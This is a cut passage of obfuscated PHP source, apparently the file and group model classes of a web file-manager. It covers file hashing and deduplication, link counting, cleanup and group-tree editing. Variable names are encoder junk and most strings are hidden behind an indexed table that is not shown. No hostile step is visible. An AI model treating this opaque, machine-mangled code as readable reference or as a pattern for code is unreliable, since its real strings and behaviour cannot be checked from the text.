"\151\157\x5f\x66\x69\154\x65\x5f\155\x65\x74\141", "\x6d\145\164\x61\x46\151\x65\154\x64" => "\x66\x69\154\x65\x49\x44"); public function fileInfo($¤²øˆ¢) { $ÍµÊ¿µ =& $_SERVER[¼èá¯æÙ]; static $Í·œò  = array(); if (!isset($Í·œò [$¤²øˆ¢])) { $ˆ¸­Õ½‡ = $ÍµÊ¿µ[2029]; $¤¼Æ‘Ê÷ = Model($ÍµÊ¿µ[555])->field($ˆ¸­Õ½‡)->where(array($ÍµÊ¿µ[553] => $¤²øˆ¢))->find(); $Í·œò [$¤²øˆ¢] = $¤¼Æ‘Ê÷; } return $Í·œò [$¤²øˆ¢]; } public function addFileByContent($ĞÚÂ”÷ñ = '', $ßµåí´ = '') { $¤¢“¡Ùå =& $_SERVER[¼èá¯æÙ]; $±êÍò¨Ç = TEMP_PATH . $¤¢“¡Ùå[2030]; if (!is_dir($±êÍò¨Ç)) { mk_dir($±êÍò¨Ç); } $œ”ÍÑ†ó = $±êÍò¨Ç . $¤¢“¡Ùå[2031] . rand_string(16); file_put_contents($œ”ÍÑ†ó, $ĞÚÂ”÷ñ); $Š¹½ŞøË = $this->addFile($œ”ÍÑ†ó, $ßµåí´, !0); if (file_exists($œ”ÍÑ†ó)) { @unlink($œ”ÍÑ†ó); } return $Š¹½ŞøË; } public function createFileName($è§Á Ú, $­‚Á›Áó = false, $óäâ÷˜² = false) { $¢µé„Ûã =& $_SERVER[¼èá¯æÙ]; $ŠÏ´ÀÇ = IO::init($¢µé„Ûã[8]); $¦èæâŒæ = $this->makeFilePath($è§Á Ú, $ŠÏ´ÀÇ, $­‚Á›Áó, $óäâ÷˜²); $ô“ÌÅÖ¶ = $ŠÏ´ÀÇ->pathFather($¦èæâŒæ); static $Ÿ™‡¿öÃ = false; $Ô€ñ»×° = $¢µé„Ûã[2032] . md5($ô“ÌÅÖ¶); if (!$Ÿ™‡¿öÃ && !Cache::get($Ô€ñ»×°)) { $Ÿ™‡¿öÃ = !0; $ŸÇ¹¬¥ï = IO::mkdir($ô“ÌÅÖ¶); if (!IO::exist($ŸÇ¹¬¥ï . $¢µé„Ûã[880])) { IO::mkfile($ŸÇ¹¬¥ï . $¢µé„Ûã[880]); } Cache::set($Ô€ñ»×°, 1, 3600 * 2); } return $¦èæâŒæ; } public function makeFilePath($Şš¹ñÔˆ, $ôèÕ€™¬, $ê¨É·Ãâ = false, $íì®´€ = false) { $¡ĞõÈ‘‰ =& $_SERVER[¼èá¯æÙ]; $èŠ¢¶‹¿ = Model($¡ĞõÈ‘‰[852])->get($¡ĞõÈ‘‰[2033]); $»š¨³Óœ = KodIO::defaultIO() . date($¡ĞõÈ‘‰[2034]); $ø–¢§¶ı = $»š¨³Óœ . rand_string(5) . short_id(100); $Şš¹ñÔˆ = str_replace($¡ĞõÈ‘‰[8], $¡ĞõÈ‘‰[11], KodIO::clear($Şš¹ñÔˆ)); $°”„Îê¯ = $ôèÕ€™¬->ext($Şš¹ñÔˆ); if (!$Şš¹ñÔˆ) { $èŠ¢¶‹¿ = $¡ĞõÈ‘‰[858]; } switch ($èŠ¢¶‹¿) { case $¡ĞõÈ‘‰[2035]: if ($°”„Îê¯) { $ø–¢§¶ı = $ø–¢§¶ı . $¡ĞõÈ‘‰[10] . $°”„Îê¯; } if ($°”„Îê¯ == $¡ĞõÈ‘‰[1971]) { $ø–¢§¶ı .= $¡ĞõÈ‘‰[1296]; } break; case $¡ĞõÈ‘‰[2036]: $¾²ñÅ¥É = Model($¡ĞõÈ‘‰[852])->get($¡ĞõÈ‘‰[853]); $ÏØÓ ‹ú = substr(md5($¡ĞõÈ‘‰[854] . $¾²ñÅ¥É . date($¡ĞõÈ‘‰[831])), 0, 8); $®É»ı‚ = KodIO::defaultDriver(); $»š¨³Óœ = $¡ĞõÈ‘‰[1327] . $®É»ı‚[$¡ĞõÈ‘‰[486]] . $¡ĞõÈ‘‰[495] . date($¡ĞõÈ‘‰[2037]) . $ÏØÓ ‹ú . $¡ĞõÈ‘‰[8]; if ($°”„Îê¯ == $¡ĞõÈ‘‰[1971]) { $Şš¹ñÔˆ .= $¡ĞõÈ‘‰[1296]; } $°ØéğÚæ = $¡ĞõÈ‘‰[2038] . $»š¨³Óœ . $Şš¹ñÔˆ; CacheLock::lock($°ØéğÚæ); $ø–¢§¶ı = $»š¨³Óœ . $Şš¹ñÔˆ; if (IO::exist($»š¨³Óœ . $Şš¹ñÔˆ)) { $û•¡áˆ¹ = substr($Şš¹ñÔˆ, 0, strlen($Şš¹ñÔˆ) - strlen($°”„Îê¯)); $÷†ò»‚À = $íì®´€ ? substr($íì®´€, 0, 5) : ($ê¨É·Ãâ ? substr($ê¨É·Ãâ, 0, 5) : rand_string(5)); $ø–¢§¶ı = $»š¨³Óœ . $û•¡áˆ¹ . $÷†ò»‚À; if ($°”„Îê¯) { $ø–¢§¶ı = $ø–¢§¶ı . $¡ĞõÈ‘‰[10] . $°”„Îê¯; } } if (IO::isOsDriver($ø–¢§¶ı) && !IO::isUploadServer($ø–¢§¶ı)) { if (IO::exist($ø–¢§¶ı)) { CacheLock::unlock($°ØéğÚæ); return $ø–¢§¶ı; } $İ§›¢¹ = IO::setContent($ø–¢§¶ı, $¡ĞõÈ‘‰[12]); if (!$İ§›¢¹) { show_json($¡ĞõÈ‘‰[2039], !1); } } CacheLock::unlock($°ØéğÚæ); break; case $¡ĞõÈ‘‰[858]: break; default: break; } return $ø–¢§¶ı; } public function addFileByRemote($›º¼ñµÛ, $ °šÏš, $ûÃí‚…Á = array()) { $øçÉ¢÷¯ =& $_SERVER[¼èá¯æÙ]; if (!IO::exist($›º¼ñµÛ)) { return !1; } $Àğ¨†Ô = $ûÃí‚…Á[$øçÉ¢÷¯[558]] ? $ûÃí‚…Á[$øçÉ¢÷¯[558]] : $øçÉ¢÷¯[12]; $Ø¡Œ¬Ê = IO::hashMd5($›º¼ñµÛ, $Àğ¨†Ô); $±Õ¡÷£ = KodIO::defaultDriver(); $ çËµ = array($øçÉ¢÷¯[631] => IO::size($›º¼ñµÛ), $øçÉ¢÷¯[2040] => 1, $øçÉ¢÷¯[505] => $ °šÏš, $øçÉ¢÷¯[891] => $±Õ¡÷£[$øçÉ¢÷¯[486]], $øçÉ¢÷¯[506] => $›º¼ñµÛ, $øçÉ¢÷¯[2041] => $ûÃí‚…Á[$øçÉ¢÷¯[686]] ? $ûÃí‚…Á[$øçÉ¢÷¯[686]] : IO::hashSimple($›º¼ñµÛ), $øçÉ¢÷¯[2042] => $Ø¡Œ¬Ê ? $Ø¡Œ¬Ê : $Àğ¨†Ô); if ($ÕŸ¸ê³Œ = $this->addFileCheckExist($ çËµ[$øçÉ¢÷¯[686]], $ çËµ[$øçÉ¢÷¯[558]], $ çËµ[$øçÉ¢÷¯[89]])) { return $ÕŸ¸ê³Œ; } return $this->addFileData($ çËµ); } private function addFileData($Ô µ÷Â) { $™ºõù†€ =& $_SERVER[¼èá¯æÙ]; if (!$Ô µ÷Â) { return !1; } $Ô µ÷Â[$™ºõù†€[89]] = intval($Ô µ÷Â[$™ºõù†€[89]]); if (!$Ô µ÷Â[$™ºõù†€[89]] && strlen($Ô µ÷Â[$™ºõù†€[686]]) > 32) { $Ô µ÷Â[$™ºõù†€[89]] = intval(substr($Ô µ÷Â[$™ºõù†€[686]], 32)); } $ßãÏ¨•† = $this->add($Ô µ÷Â); return $this->find($ßãÏ¨•†); } public function addFile($úô ©•ò, $úÓîú”Å, $“£ùßÖÏ = false) { $Ö‡µõœ² =& $_SERVER[¼èá¯æÙ]; $·ìÊÑÔ = IO::hashSimple($úô ©•ò); $œ¯§±–¹ = IO::size($úô ©•ò); $ÌÄóÜó• = $œ¯§±–¹ <= 1024 * 1024 * 10 ? IO::hashMd5($úô ©•ò) : $Ö‡µõœ²[12]; $è£Ô£á = $Ö‡µõœ²[2043] . $·ìÊÑÔ; CacheLock::lock($è£Ô£á); if ($ÌÄóÜó• && $·ìÊÑÔ) { $ù•·ÉÉÏ = $this->addFileCheckExist($·ìÊÑÔ, $ÌÄóÜó•, $œ¯§±–¹); if ($ù•·ÉÉÏ) { CacheLock::unlock($è£Ô£á); return $ù•·ÉÉÏ; } } $ç¢°Æñ¢ = $this->addFileMake($úô ©•ò, $œ¯§±–¹, $·ìÊÑÔ, $ÌÄóÜó•, $úÓîú”Å, $“£ùßÖÏ); $³¢ÊÏüÆ = $this->addFileData($ç¢°Æñ¢); CacheLock::unlock($è£Ô£á); if (!$ÌÄóÜó• && $³¢ÊÏüÆ) { $this->fileMd5Check($³¢ÊÏüÆ); } return $³¢ÊÏüÆ; } public function fileMd5Check($İÉİ°ŸŒ) { $×Øõ÷ÓÎ =& $_SERVER[¼èá¯æÙ]; $õ—ÁÇ = array($İÉİ°ŸŒ[$×Øõ÷ÓÎ[552]], $İÉİ°ŸŒ[$×Øõ÷ÓÎ[97]]); $Ù¥¶¹Ö = $×Øõ÷ÓÎ[2044] . $İÉİ°ŸŒ[$×Øõ÷ÓÎ[97]]; $¬¬‘Ùú = $×Øõ÷ÓÎ[2045] . $İÉİ°ŸŒ[$×Øõ÷ÓÎ[552]]; TaskQueue::add($×Øõ÷ÓÎ[2046], $õ—ÁÇ, $Ù¥¶¹Ö, $¬¬‘Ùú); } public function fileMd5Set($ ñı²¥Û, $ÕŸ…£åö) { $şËØÑ·« =& $_SERVER[¼èá¯æÙ]; $˜ºÜ”¬ = $this->find($ ñı²¥Û); if (!$˜ºÜ”¬ || $˜ºÜ”¬[$şËØÑ·«[558]]) { return; } $°ÎÍ«ü× = IO::hashMd5($ÕŸ…£åö); if (!$°ÎÍ«ü×) { return $şËØÑ·«[12]; } $this->where(array($şËØÑ·«[552] => $ ñı²¥Û))->save(array($şËØÑ·«[558] => $°ÎÍ«ü×)); } public function addFileMake($¯çéˆ¿§, $ñå†á¤¼, $æ°¸óî, $Úåüëıô, $à°ò¾ç®, $ˆÇĞÌöî) { $»…‚ü„ =& $_SERVER[¼èá¯æÙ]; $µªÊÏ·Ú = $this->createFileName($à°ò¾ç®, $æ°¸óî, $Úåüëıô); $—ìÃ™˜å = get_path_father($µªÊÏ·Ú); $…™‰éõÃ = get_path_this($µªÊÏ·Ú); if ($ˆÇĞÌöî) { $­ã‚‹¸ = IO::move($¯çéˆ¿§, $—ìÃ™˜å, !1, $…™‰éõÃ); } else { $­ã‚‹¸ = IO::copy($¯çéˆ¿§, $—ìÃ™˜å, !1, $…™‰éõÃ); } if (!$­ã‚‹¸) { return !1; } $³×†ü = KodIO::defaultDriver(); $¯Ì„€ï = array($»…‚ü„[631] => $ñå†á¤¼, $»…‚ü„[2040] => 1, $»…‚ü„[505] => $à°ò¾ç®, $»…‚ü„[891] => $³×†ü[$»…‚ü„[486]], $»…‚ü„[506] => $µªÊÏ·Ú, $»…‚ü„[2041] => $æ°¸óî, $»…‚ü„[2042] => $Úåüëıô); return $¯Ì„€ï; } public function addFileCheckExist($³¹ì”Ãç, $éö¼×ø˜, $±õ î›) { $æ¢¢†„Ä =& $_SERVER[¼èá¯æÙ]; $›­³¥ïŞ = $this->findByHash($³¹ì”Ãç, $éö¼×ø˜); if (!$›­³¥ïŞ) { return !1; } $–ÛŒÆ˜Å = array($æ¢¢†„Ä[2040] => intval($›­³¥ïŞ[$æ¢¢†„Ä[2047]]) + 1, $æ¢¢†„Ä[631] => $±õ î›); $this->where(array($æ¢¢†„Ä[553] => $›­³¥ïŞ[$æ¢¢†„Ä[552]]))->save($–ÛŒÆ˜Å); return $›­³¥ïŞ; } public function remove($ÒêÌí¸œ) { $this->linkCountChange($ÒêÌí¸œ, !1); $this->clearEmpty(); return !0; } public function linkAdd($Ö”Òë) { $this->linkCountChange($Ö”Òë, !0); } public function linkCountChange($ô¿öƒ”¾, $„í•´ï‘) { $¬ğ¡üìÑ =& $_SERVER[¼èá¯æÙ]; if (!$ô¿öƒ”¾) { return; } if (!is_array($ô¿öƒ”¾)) { $ô¿öƒ”¾ = array($ô¿öƒ”¾); } $à”„“£ = array(); foreach ($ô¿öƒ”¾ as $ÛÂà»Äû) { $ì•Î„Ê = $ÛÂà»Äû . $¬ğ¡üìÑ[12]; if (!$à”„“£[$ì•Î„Ê]) { $à”„“£[$ì•Î„Ê] = 0; } $à”„“£[$ì•Î„Ê]++; } $‚¶Ÿ˜Ù = array(); foreach ($à”„“£ as $ÛÂà»Äû => $¢õŞå’‹) { $ì•Î„Ê = $¢õŞå’‹ . $¬ğ¡üìÑ[12]; if (!$‚¶Ÿ˜Ù[$ì•Î„Ê]) { $‚¶Ÿ˜Ù[$ì•Î„Ê] = array(); } $‚¶Ÿ˜Ù[$ì•Î„Ê][] = $ÛÂà»Äû; } foreach ($‚¶Ÿ˜Ù as $¢õŞå’‹ => $Úò¡ßé£) { if (!$Úò¡ßé£) { continue; } $¢õŞå’‹ = $„í•´ï‘ ? $¢õŞå’‹ : -intval($¢õŞå’‹); $Ô¨ıÚ›ö = array($¬ğ¡üìÑ[552] => array($¬ğ¡üìÑ[7], $Úò¡ßé£)); if ($¢õŞå’‹ < 0) { $Ô¨ıÚ›ö[$¬ğ¡üìÑ[2047]] = array($¬ğ¡üìÑ[1097], abs($¢õŞå’‹)); } $this->where($Ô¨ıÚ›ö)->setAdd($¬ğ¡üìÑ[2047], $¢õŞå’‹); } } public function findByHash($Öõô°´ı, $ğ¯Ó¬° = false) { $Šë«…í« =& $_SERVER[¼èá¯æÙ]; if (!$Öõô°´ı && !$ğ¯Ó¬°) { return !1; } $›æÂŞ®“ = array($Šë«…í«[2041] => $Öõô°´ı); if ($ğ¯Ó¬°) { $›æÂŞ®“ = array($Šë«…í«[2042] => $ğ¯Ó¬°); } return $this->order($Šë«…í«[2048])->where($›æÂŞ®“)->find(); } public function clearEmpty($á³ß¬ö¤ = 1) { $ Ï‡©ëÖ =& $_SERVER[¼èá¯æÙ]; $®…¶İÇû = time() - 3600 * 24 * $á³ß¬ö¤; $±«ã¥¬¦ = $ Ï‡©ëÖ[2049] . $®…¶İÇû; $Ö–íãÑ£ = $this->where($±«ã¥¬¦)->select(); if (!$Ö–íãÑ£) { return; } $‡öİÁ³ü = new Task($ Ï‡©ëÖ[2050], $ Ï‡©ëÖ[12], count($Ö–íãÑ£)); foreach ($Ö–íãÑ£ as $ÜÙ‹¨†) { $‡öİÁ³ü->update(1); $this->resetFile($ÜÙ‹¨†); } $‡öİÁ³ü->end(); } public function resetFile($÷”¸áÙæ) { $İƒ›ñÏû =& $_SERVER[¼èá¯æÙ]; $İó©è¥¦ = array($İƒ›ñÏû[553] => $÷”¸áÙæ[$İƒ›ñÏû[552]]); $ŠïÂã˜‡ = Model($İƒ›ñÏû[1426])->where($İó©è¥¦)->count(); $ÎÄ°«¼ = Model($İƒ›ñÏû[2051])->where($İó©è¥¦)->count(); $‰ŠÇ«õ¦ = intval($ŠïÂã˜‡) + intval($ÎÄ°«¼); if ($‰ŠÇ«õ¦ == 0) { IO::remove($÷”¸áÙæ[$İƒ›ñÏû[97]]); Model($İƒ›ñÏû[2052])->delete($÷”¸áÙæ[$İƒ›ñÏû[552]]); $this->where($İó©è¥¦)->delete(); $this->metaSet($÷”¸áÙæ[$İƒ›ñÏû[552]], null, null); write_log(ACTION . $İƒ›ñÏû[2053] . KodUser::id() . $İƒ›ñÏû[2054] . $÷”¸áÙæ[$İƒ›ñÏû[552]] . $İƒ›ñÏû[2055] . $÷”¸áÙæ[$İƒ›ñÏû[89]] . $İƒ›ñÏû[211] . $÷”¸áÙæ[$İƒ›ñÏû[97]], $İƒ›ñÏû[2056]); return; } if ($÷”¸áÙæ[$İƒ›ñÏû[2047]] != $‰ŠÇ«õ¦) { $this->where($İó©è¥¦)->save(array($İƒ›ñÏû[2040] => $‰ŠÇ«õ¦)); } } public function storageInfo($ø³Ö©Â = false) { $â„ö­Ğ‚ =& $_SERVER[¼èá¯æÙ]; $ÙÎüùÛı = $this->count() + 0.0; $„ èâù = 0; $¯¦†œâ™ = 1; $àãÙÄÓˆ = 0; $Æˆèí¼ = 5000; for ($™¯üÒì§ = 0; $™¯üÒì§ < $ÙÎüùÛı; $™¯üÒì§ = $™¯üÒì§ + $Æˆèí¼) { $ñô›ø—Ò = $this->limit($™¯üÒì§, $™¯üÒì§ + $Æˆèí¼)->select(); foreach ($ñô›ø—Ò as $·¶™°Œ­) { $¯¦†œâ™ += $·¶™°Œ­[$â„ö­Ğ‚[89]] * $·¶™°Œ­[$â„ö­Ğ‚[2047]]; $„ èâù += $·¶™°Œ­[$â„ö­Ğ‚[89]] * ($·¶™°Œ­[$â„ö­Ğ‚[2047]] - 1); $àãÙÄÓˆ += $·¶™°Œ­[$â„ö­Ğ‚[2047]]; } } $à®ë×Í‰ = array($â„ö­Ğ‚[2057] => $¯¦†œâ™, $â„ö­Ğ‚[2058] => $„ èâù, $â„ö­Ğ‚[2059] => $„ èâù / $¯¦†œâ™, $â„ö­Ğ‚[93] => $ÙÎüùÛı, $â„ö­Ğ‚[2060] => $àãÙÄÓˆ); return $à®ë×Í‰; } } class GroupModel extends ModelBase { protected $tableName = "\x67\x72\x6f\165\160"; protected $tableMeta = array("\164\141\x62\154\145\x4e\x61\x6d\x65" => "\x67\x72\157\165\x70\137\x6d\x65\x74\x61", "\155\145\164\x61\x46\151\x65\x6c\x64" => "\x67\x72\157\x75\x70\111\104"); protected function cacheFunctionAlias($Û ¿¥¡‘) { $¹†¦ûİÒ =& $_SERVER[¼èá¯æÙ]; return array($¹†¦ûİÒ[2061] => array($Û ¿¥¡‘[0], $¹†¦ûİÒ[2062]), $¹†¦ûİÒ[2063] => array($Û ¿¥¡‘[0], $¹†¦ûİÒ[2064])); } protected function getInfo($¶ŒÏŒ¥ç, $¾ÊıÈÓ» = false) { $®ŸÙ£• = $this->getInfoSimple($¶ŒÏŒ¥ç); if (!$®ŸÙ£•) { return !1; } if ($¾ÊıÈÓ») { return $this->_listDataApplyItem($®ŸÙ£•); } return $this->cacheFunctionGet($_SERVER[¼èá¯æÙ][2065], $¶ŒÏŒ¥ç); } protected function getInfoSimple($ûòßÈØ…, $µ»íŒ¹© = false) { $°àÚ§‹ù =& $_SERVER[¼èá¯æÙ]; if ($µ»íŒ¹©) { $ˆ¸øá¹ = array($°àÚ§‹ù[1979] => intval($ûòßÈØ…)); $«üå…éó = $this->where($ˆ¸øá¹)->find(); return is_array($«üå…éó) ? $«üå…éó : array(); } return $this->cacheFunctionGet($°àÚ§‹ù[2066], $ûòßÈØ…); } protected function groupAdd($…™¬Ûşâ) { $Ä”•¬òœ =& $_SERVER[¼èá¯æÙ]; if (!$…™¬Ûşâ[$Ä”•¬òœ[202]] && isset($…™¬Ûşâ[$Ä”•¬òœ[1979]]) && $…™¬Ûşâ[$Ä”•¬òœ[1979]] == 1) { if ($ûÈñÕàª = $this->getInfoSimple($…™¬Ûşâ[$Ä”•¬òœ[1979]], !0)) { return $…™¬Ûşâ[$Ä”•¬òœ[1979]]; } } else { $ûÈñÕàª = $this->getInfoSimple($…™¬Ûşâ[$Ä”•¬òœ[202]]); if (!$ûÈñÕàª) { return !1; } } $°½ãÚ§ì = $Ä”•¬òœ[604]; if ($ûÈñÕàª[$Ä”•¬òœ[595]]) { $°½ãÚ§ì = $ûÈñÕàª[$Ä”•¬òœ[595]] . $ûÈñÕàª[$Ä”•¬òœ[1979]] . $Ä”•¬òœ[50]; } $ÉÈŒ«·± = array($Ä”•¬òœ[505] => $this->groupNameAuto($…™¬Ûşâ[$Ä”•¬òœ[202]], $…™¬Ûşâ[$Ä”•¬òœ[32]]), $Ä”•¬òœ[488] => $…™¬Ûşâ[$Ä”•¬òœ[202]], $Ä”•¬òœ[666] => $°½ãÚ§ì, $Ä”•¬òœ[2067] => $…™¬Ûşâ[$Ä”•¬òœ[1965]], $Ä”•¬òœ[2068] => 0, $Ä”•¬òœ[1983] => 0); if (isset($…™¬Ûşâ[$Ä”•¬òœ[2003]])) { $ÉÈŒ«·±[$Ä”•¬òœ[2003]] = $…™¬Ûşâ[$Ä”•¬òœ[2003]]; } else { $Ä¿‚æè¾ = $this->max($Ä”•¬òœ[2003]); if (!$Ä¿‚æè¾) { $Ä¿‚æè¾ = 0; } $ÉÈŒ«·±[$Ä”•¬òœ[2003]] = $Ä¿‚æè¾ + 1; } if (!empty($…™¬Ûşâ[$Ä”•¬òœ[1979]])) { $ÉÈŒ«·±[$Ä”•¬òœ[1979]] = $…™¬Ûşâ[$Ä”•¬òœ[1979]]; } $Õ¡¦‚ôº = $this->add($ÉÈŒ«·±); $this->setNamePinyin($Õ¡¦‚ôº, $ÉÈŒ«·±[$Ä”•¬òœ[32]]); if (isset($…™¬Ûşâ[$Ä”•¬òœ[2069]])) { $this->metaSet($Õ¡¦‚ôº, array($Ä”•¬òœ[2069] => $…™¬Ûşâ[$Ä”•¬òœ[2069]], $Ä”•¬òœ[2070] => $…™¬Ûşâ[$Ä”•¬òœ[2070]])); unset($…™¬Ûşâ[$Ä”•¬òœ[2069]]); unset($…™¬Ûşâ[$Ä”•¬òœ[2070]]); } Model($Ä”•¬òœ[1426])->groupRootAdd($Õ¡¦‚ôº); $this->_clearCache($…™¬Ûşâ[$Ä”•¬òœ[202]]); return $Õ¡¦‚ôº; } protected function groupEdit($†„ÖÂµ, $èğ¾š©) { $‰®ö¶Ø§ =& $_SERVER[¼èá¯æÙ]; $õîÇÄ¦ = $this->getInfoSimple($†„ÖÂµ); if (!$õîÇÄ¦) { return !1; } if (!empty($èğ¾š©[$‰®ö¶Ø§[202]])) { $¡ëİÃ = $this->getInfoSimple($èğ¾š©[$‰®ö¶Ø§[202]]); if (!$¡ëİÃ) { return !1; } if ($õîÇÄ¦[$‰®ö¶Ø§[1979]] == $¡ëİÃ[$‰®ö¶Ø§[1979]]) { return !1; } if ($èğ¾š©[$‰®ö¶Ø§[202]] != $õîÇÄ¦[$‰®ö¶Ø§[202]]) { if ($¡ëİÃ[$‰®ö¶Ø§[595]] !== $õîÇÄ¦[$‰®ö¶Ø§[595]] && strpos($¡ëİÃ[$‰®ö¶Ø§[595]], $õîÇÄ¦[$‰®ö¶Ø§[595]] . $õîÇÄ¦[$‰®ö¶Ø§[1979]] . $‰®ö¶Ø§[50]) === 0) { return !1; } $èğ¾š©[$‰®ö¶Ø§[666]] = $¡ëİÃ[$‰®ö¶Ø§[595]] . $èğ¾š©[$‰®ö¶Ø§[202]] . $‰®ö¶Ø§[50]; $this->_changeChildLevel($õîÇÄ¦, $¡ëİÃ); $this->_clearCache($¡ëİÃ[$‰®ö¶Ø§[1979]]); $this->_clearCache($õîÇÄ¦[$‰®ö¶Ø§[202]]); } } if (isset($èğ¾š©[$‰®ö¶Ø§[32]])) { $this->setNamePinyin($†„ÖÂµ, $èğ¾š©[$‰®ö¶Ø§[32]]); } if (isset($èğ¾š©[$‰®ö¶Ø§[2069]])) { $this->metaSet($†„ÖÂµ, array($‰®ö¶Ø§[2069] => $èğ¾š©[$‰®ö¶Ø§[2069]], $‰®ö¶Ø§[2070] => $èğ¾š©[$‰®ö¶Ø§[2070]])); unset($èğ¾š©[$‰®ö¶Ø§[2069]]); unset($èğ¾š©[$‰®ö¶Ø§[2070]]); } $this->_clearChildrenCache($õîÇÄ¦); return $this->where(array($‰®ö¶Ø§[2071] => $†„ÖÂµ))->save($èğ¾š©); } private function _clearChildrenCache($°†¿Ÿ) { $Ö“ïÓø =& $_SERVER[¼èá¯æÙ]; $èˆãô ü = array($Ö“ïÓø[666] => array($Ö“ïÓø[626], $°†¿Ÿ[$Ö“ïÓø[595]] . $°†¿Ÿ[$Ö“ïÓø[1979]] . $Ö“ïÓø[627])); $®¯‚Î = $this->field($Ö“ïÓø[1979])->where($èˆãô ü)->select(); foreach ($®¯‚Î as $¥š¨ÏÍ¬) { $this->_clearCache($¥š¨ÏÍ¬[$Ö“ïÓø[1979]]); } } private function _clearCache($áÏ»ÖŠ) { $ˆşÑşã =& $_SERVER[¼èá¯æÙ]; $this->cacheFunctionClear($ˆşÑşã[2065], $áÏ»ÖŠ); $this->cacheFunctionClear($ˆşÑşã[2066], $áÏ»ÖŠ); } private function _changeChildLevel($®ñƒÉõš, $ß÷Â°ğ, $ÕŸÙÒë = false) { $±À¨õÍ© =& $_SERVER[¼èá¯æÙ]; $×ºÉ§‘¨ = $®ñƒÉõš[$±À¨õÍ©[595]] . $®ñƒÉõš[$±À¨õÍ©[1979]] . $±À¨õÍ©[50]; $ï™Ô»½Ú = $ß÷Â°ğ[$±À¨õÍ©[595]] . $ß÷Â°ğ[$±À¨õÍ©[1979]] . $±À¨õÍ©[50] . $®ñƒÉõš[$±À¨õÍ©[1979]] . $±À¨õÍ©[50]; if ($ÕŸÙÒë) { $ï™Ô»½Ú = $ß÷Â°ğ[$±À¨õÍ©[595]] . $ß÷Â°ğ[$±À¨õÍ©[1979]] . $±À¨õÍ©[50]; } $ò™ô™ôÁ = array($±À¨õÍ©[666] => array($±À¨õÍ©[626], $®ñƒÉõš[$±À¨õÍ©[595]] . $®ñƒÉõš[$±À¨õÍ©[1979]] . $±À¨õÍ©[627])); $îÊÏñ¤¨ = array($±À¨õÍ©[666] => array($±À¨õÍ©[675], "\162\x65\x70\154\141\143\x65\x28\160\141\x72\145\156\x74\114\x65\x76\x65\154\x2c\x27{$×ºÉ§‘¨}\47\54\x27{$ï™Ô»½Ú}\47\51")); $this->_clearChildrenCache($®ñƒÉõš); $this->where($ò™ô™ôÁ)->data($îÊÏñ¤¨)->save(); } public function setNamePinyin($ïã”“Ì, $Ú³áÅêí = false) { $Åùî Êğ =& $_SERVER[¼èá¯æÙ]; if (!$Ú³áÅêí) { $ÓÓŠ„ = $this->getInfoSimple($ïã”“Ì); $Ú³áÅêí = $ÓÓŠ„[$Åùî Êğ[32]]; } if (!Input::check($Ú³áÅêí, $Åùî Êğ[669])) { $this->metaSet($ïã”“Ì, $Åùî Êğ[549], null); $this->metaSet($ïã”“Ì, $Åùî Êğ[548], null); return; } $ƒøìÈçœ = array($Åùî Êğ[549] => str_replace($Åùî Êğ[53], $Åùî Êğ[12], Pinyin::get($Ú³áÅêí)), $Åùî Êğ[548] => Pinyin::get($Ú³áÅêí, $Åùî Êğ[670])); $this->metaSet($ïã”“Ì, $ƒøìÈçœ); } protected function metaSet($˜÷°€Œ¾, $şª‹ÇÓ = null, $â”‡Ëàõ = null) { $this->_clearCache($˜÷°€Œ¾); return parent::metaSet($˜÷°€Œ¾, $şª‹ÇÓ, $â”‡Ëàõ); } protected function groupStatus($ôƒËìîı, $Ê×€Ğõ¿) { $ø•ÑóŠí =& $_SERVER[¼èá¯æÙ]; $Ô±—ï‡ı = $this->getInfoSimple($ôƒËìîı); if (!$Ô±—ï‡ı) { return !1; } $this->_clearCache($ôƒËìîı); return $this->metaSet($ôƒËìîı, $ø•ÑóŠí[832], $Ê×€Ğõ¿); if ($Ê×€Ğõ¿ == $ø•ÑóŠí[101]) { $óæÊ¬ä = $this->parentLevelArray($Ô±—ï‡ı[$ø•ÑóŠí[595]]); } else { } $óæÊ¬ä[] = $Ô±—ï‡ı[$ø•ÑóŠí[1979]]; $çˆ ¶« = array(); foreach ($óæÊ¬ä as $ôƒËìîı) { $çˆ ¶«[] = array($ø•ÑóŠí[1979] => $ôƒËìîı, $ø•ÑóŠí[107] => $ø•ÑóŠí[832], $ø•ÑóŠí[462] => $Ê×€Ğõ¿); $this->_clearCache($ôƒËìîı); } return Model($ø•ÑóŠí[2072])->addAll($çˆ ¶«, array(), !0); } protected function groupRemove($Î¼†å³, $§ ˆéõâ = false) { $º‰Ú¶³… =& $_SERVER[¼èá¯æÙ]; $¦…ˆª¨™ = array($º‰Ú¶³…[1979] => $Î¼†å³); $´­Ö¾Õã = $this->where($¦…ˆª¨™)->find(); if (!$´­Ö¾Õã || $´­Ö¾Õã[$º‰Ú¶³…[202]] == 0) { return !1; } if (!$§ ˆéõâ) { $Øª½åÇì = $this->getInfoSimple($´­Ö¾Õã[$º‰Ú¶³…[202]]); $this->_changeChildLevel($´­Ö¾Õã, $Øª½åÇì, !0); $this->where(array($º‰Ú¶³…[202] => $Î¼†å³))->save(array($º‰Ú¶³…[202] => $´­Ö¾Õã[$º‰Ú¶³…[202]])); $this->_clearCache($Øª½åÇì[$º‰Ú¶³…[1979]]); } Model($º‰Ú¶³…[2072])->where($¦…ˆª¨™)->delete(); Model($º‰Ú¶³…[2073])->where($¦…ˆª¨™)->delete(); Model($º‰Ú¶³…[907])->groupRootRemove($Î¼†å³); $this->_clearCache($´­Ö¾Õã[$º‰Ú¶³…[202]]); return $this->where($¦…ˆª¨™)->delete(); } protected function groupSort($Ü¦¬ÕÙÂ) { $î÷ÛÁ¦¿ =& $_SERVER[¼èá¯æÙ]; $ôŸ²Ê¢ = array(); foreach ($Ü¦¬ÕÙÂ as $ıÏÇò¸¯ => $¦ë“Ğú) { $ôŸ²Ê¢[] = array($î÷ÛÁ¦¿[1979], $¦ë“Ğú, $î÷ÛÁ¦¿[2003], $ıÏÇò¸¯ + 1); } $this->saveAll($ôŸ²Ê¢); } public function listData() { $á¸Áª…Ÿ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($á¸Áª…Ÿ[$_SERVER[¼èá¯æÙ][457]]); return $á¸Áª…Ÿ; } private function _makeOrder($­¨Ûİ®ù = '') { $†¬ ÑËç =& $_SERVER[¼èá¯æÙ]; $¶ú¿¤ = array($†¬ ÑËç[1979], $†¬ ÑËç[32], $†¬ ÑËç[1967], $†¬ ÑËç[243]); $ĞßÑ­ô = array($†¬ ÑËç[534] => $†¬ ÑËç[535], $†¬ ÑËç[536] => $†¬ ÑËç[537]); $Üşá‰¸ = Input::get($†¬ ÑËç[541], $†¬ ÑËç[7], $†¬ 